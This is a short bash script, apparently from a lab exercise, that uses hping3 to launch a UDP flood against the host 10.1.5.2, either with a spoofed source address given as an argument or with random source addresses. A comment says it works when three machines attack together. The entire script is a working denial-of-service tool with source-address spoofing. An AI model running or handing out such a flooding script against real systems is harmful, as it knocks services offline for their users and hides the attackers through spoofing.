#!/bin/bash

# It works if 3 machines are attacking

if [ $# -ge 1 ]
then
    if [ "$1" ]
    then
        echo "START SPOOFED SOURCE"
        sudo hping3 -2 --flood -a $1 10.1.5.2 > /dev/null
    fi
else
    echo "START RANDOM SOURCE"
    sudo hping3 -2 --flood --rand-source 10.1.5.2 > /dev/null
fi
